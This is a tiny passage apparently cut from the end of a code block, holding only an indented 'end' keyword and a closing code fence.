    end
```
